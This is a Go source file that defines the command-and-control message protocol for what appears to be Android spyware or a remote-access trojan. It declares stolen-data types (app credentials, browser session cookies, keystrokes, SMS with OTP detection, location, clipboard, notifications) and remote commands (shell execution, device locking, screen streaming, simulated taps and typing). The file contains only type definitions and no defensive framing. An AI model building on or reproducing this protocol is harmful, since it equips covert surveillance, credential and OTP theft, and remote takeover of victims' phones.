package types

import (
	"encoding/json"
	"time"
)

// Message types for C2 <-> Device protocol
const (
	MsgRegister     = "register"
	MsgHeartbeat    = "heartbeat"
	MsgData         = "data"
	MsgCommand      = "command"
	MsgCommandAck   = "command_ack"
	MsgError        = "error"
	MsgScreenState  = "screen_state"
	MsgStreamFrame  = "stream_frame"
)

// Data types sent by devices
const (
	DataTypeCredential   = "credential"
	DataTypeSession      = "session"
	DataTypeFile         = "file"
	DataTypeSMS          = "sms"
	DataTypeKeylog       = "keylog"
	DataTypeLocation     = "location"
	DataTypeNotification = "notification"
	DataTypeClipboard    = "clipboard"
)

// Command types sent to devices
const (
	CmdStartSweep    = "start_sweep"
	CmdStopSweep     = "stop_sweep"
	CmdLockDevice    = "lock_device"
	CmdReleaseDevice = "release_device"
	CmdExecCommand   = "exec_command"
	CmdUpdateConfig  = "update_config"
	CmdStartStream   = "start_stream"
	CmdStopStream    = "stop_stream"
	CmdTap           = "tap"
	CmdType          = "type"
	CmdScroll        = "scroll"
	CmdSwipe         = "swipe"
)

type DeviceInfo struct {
	DeviceID        string `json:"device_id"`
	DeviceName      string `json:"device_name"`
	Manufacturer    string `json:"manufacturer"`
	Model           string `json:"model"`
	AndroidVersion  string `json:"android_version"`
	APiLevel        int    `json:"api_level"`
	IPAddress       string `json:"ip_address"`
}

type Device struct {
	ID              string    `json:"id"`
	DeviceID        string    `json:"device_id"`
	DeviceName      string    `json:"device_name"`
	Manufacturer    string    `json:"manufacturer"`
	Model           string    `json:"model"`
	AndroidVersion  string    `json:"android_version"`
	APiLevel        int       `json:"api_level"`
	IPAddress       string    `json:"ip_address"`
	Status          string    `json:"status"`
	ScreenState     string    `json:"screen_state,omitempty"`
	FirstSeen       time.Time `json:"first_seen"`
	LastSeen        time.Time `json:"last_seen"`
}

// WSMessage is the top-level envelope for all WebSocket messages
type WSMessage struct {
	Type      string          `json:"type"`
	DeviceID  string          `json:"device_id,omitempty"`
	Data      json.RawMessage `json:"data,omitempty"`
	CommandID string          `json:"command_id,omitempty"`
	Command   string          `json:"command,omitempty"`
	Params    json.RawMessage `json:"params,omitempty"`
	Status    string          `json:"status,omitempty"`
	Error     string          `json:"error,omitempty"`
	Payload   string          `json:"payload,omitempty"` // base64 encrypted
	DataType  string          `json:"data_type,omitempty"`
	Binary    bool            `json:"binary,omitempty"`
	Timestamp int64           `json:"timestamp,omitempty"`
}

type RegisterMessage struct {
	DeviceInfo
	Timestamp int64 `json:"timestamp"`
}

type HeartbeatMessage struct {
	DeviceID  string `json:"device_id"`
	Timestamp int64  `json:"timestamp"`
}

type CommandMessage struct {
	CommandID string          `json:"command_id"`
	Command   string          `json:"command"`
	Params    json.RawMessage `json:"params,omitempty"`
}

type CommandAck struct {
	CommandID string `json:"command_id"`
	Status    string `json:"status"` // received, executing, done, failed
	Result    string `json:"result,omitempty"`
}

type SweepParams struct {
	Duration int      `json:"duration"`
	Targets  []string `json:"targets"`
}

type DataPayload struct {
	DeviceID  string `json:"device_id"`
	DataType  string `json:"data_type"`
	Payload   string `json:"payload"` // base64 encrypted JSON
	Timestamp int64  `json:"timestamp"`
}

type CredentialData struct {
	AppName        string `json:"app_name"`
	CredentialType string `json:"credential_type"`
	Value          string `json:"value"`
	Metadata       string `json:"metadata,omitempty"`
}

type SessionData struct {
	Browser   string `json:"browser"`
	Domain    string `json:"domain"`
	CookieName string `json:"cookie_name"`
	CookieValue string `json:"cookie_value"`
	FullCookie string `json:"full_cookie_json,omitempty"`
}

type FileData struct {
	FilePath     string `json:"file_path"`
	FileSize     int64  `json:"file_size"`
	FileType     string `json:"file_type"`
	KeywordMatch string `json:"keyword_match,omitempty"`
	UploadedURL  string `json:"uploaded_url,omitempty"`
	ThumbnailURL string `json:"thumbnail_url,omitempty"`
}

type SMSData struct {
	Sender     string `json:"sender"`
	Body       string `json:"body"`
	IsOTP      bool   `json:"is_otp"`
	ReceivedAt int64  `json:"received_at"`
}

type KeylogData struct {
	AppPackage  string `json:"app_package"`
	AppName     string `json:"app_name"`
	Keystrokes  string `json:"keystrokes"`
	WindowTitle string `json:"window_title,omitempty"`
}

type LocationData struct {
	Latitude  float64 `json:"latitude"`
	Longitude float64 `json:"longitude"`
	Altitude  float64 `json:"altitude,omitempty"`
	Accuracy  float64 `json:"accuracy,omitempty"`
	Speed     float64 `json:"speed,omitempty"`
	Timestamp int64   `json:"timestamp"`
}

type NotificationData struct {
	AppName string `json:"app_name"`
	Content string `json:"content"`
	PostTime int64 `json:"post_time"`
}

type ClipboardData struct {
	Content   string `json:"content"`
	Timestamp int64  `json:"timestamp"`
}

type ScreenStateData struct {
	State     string `json:"state"`
	Timestamp int64  `json:"timestamp"`
}

type StreamFrameData struct {
	DeviceID  string `json:"device_id"`
	FrameID   int    `json:"frame_id"`
	Data      string `json:"data"` // base64 JPEG
}

type TapParams struct {
	X float64 `json:"x"`
	Y float64 `json:"y"`
}

type TypeParams struct {
	Text string `json:"text"`
}

type ScrollParams struct {
	Direction string `json:"direction"`
}

type SwipeParams struct {
	X1 float64 `json:"x1"`
	Y1 float64 `json:"y1"`
	X2 float64 `json:"x2"`
	Y2 float64 `json:"y2"`
}

type StreamParams struct {
	Quality string `json:"quality"`
	FPS     int    `json:"fps"`
}
